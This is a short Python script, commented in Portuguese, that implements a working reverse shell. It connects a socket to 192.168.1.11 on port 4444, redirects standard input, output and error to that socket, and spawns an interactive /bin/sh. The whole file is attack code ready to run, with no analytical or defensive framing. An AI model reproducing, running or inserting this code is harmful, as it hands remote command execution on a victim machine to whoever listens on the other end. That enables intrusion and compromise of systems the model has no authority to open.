import socket
import subprocess
import os

def reverse_shell(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    # Redireciona a entrada e saída padrão para o socket
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr

    # Executa o shell
    subprocess.call(['/bin/sh', '-i'])

if __name__ == "__main__":
    reverse_shell('192.168.1.11', 4444)
